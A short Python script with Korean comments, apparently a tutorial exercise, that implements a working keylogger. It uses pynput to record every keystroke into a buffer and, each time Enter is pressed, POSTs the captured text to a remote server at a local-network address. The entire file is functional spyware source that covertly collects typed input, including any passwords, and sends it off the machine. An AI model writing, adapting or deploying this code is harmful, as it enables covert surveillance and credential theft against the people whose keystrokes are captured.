from pynput.keyboard import Listener, Key 
import requests
# server.py의 get_logs로 보내기
server_url = 'http://192.168.0.41:5000/get_logs'

# log를 임시로 저장할 변수 만들기
logs = ''

def on_press(key):
    # 전역변수로 logs 지정
    global logs
    
    # key class 불러오고
    # 만약 key입력이 enter일 때
    if key == Key.enter:
        try:
            # server에 request(request import 추가)
            # post방식으롤 server_url로 보내고 data는 logs로 보내는데
            requests.post(server_url, data = {'logs' : logs})
        # 서버가 닫혀있는 경우
        except:
            print('Server error!')
            
        # 보냈던 건 초기화시키기
        logs = ''

    # 만약 enter가 아니면
    else:
    # logs에 key를 str로 변환시켜 보내기
        logs += str(key).replace("'", "")

    

with Listener(on_press = on_press) as listener:
    listener.join()
